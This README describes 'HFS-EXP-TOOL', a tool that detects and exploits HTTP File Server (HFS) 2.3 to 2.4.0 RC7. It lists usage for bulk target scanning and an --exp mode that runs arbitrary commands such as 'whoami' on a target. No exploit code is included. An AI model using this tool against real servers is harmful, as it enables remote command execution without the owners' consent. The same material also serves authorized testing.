# HFS-EXP-TOOL

[简体中文](https://github.com/10cks/hfs-exp-tool/blob/main/README_CN.md) | [English](https://github.com/10cks/hfs-exp-tool/blob/main/README.md)

HTTP File Server multipurpose tool, target version:
- 	HFS 2.3 beta
- 	HFS 2.3d
-   HFS 2.3m
-   HFS 2.3k
-   HFS 2.4.0 RC6
-   HFS 2.4.0 RC7

Usage:  
- hfs-exp-tool.exe --detect-url <protocol:host:port>
- hfs-exp-tool.exe --detect-file <filename>
- hfs-exp-tool.exe --exp <protocol:host:port> <command> [arguments...]

Demo:

Batch Inspection

```
.\hfs-exp-tool.exe --detect-file .\url.txt
```

Individual Detection Url

```
.\hfs-exp-tool.exe --detect-url http://127.0.0.1:8003
```

Command Execution

```
.\hfs-exp-tool.exe --exp http://127.0.0.1:8003 "whoami"
```
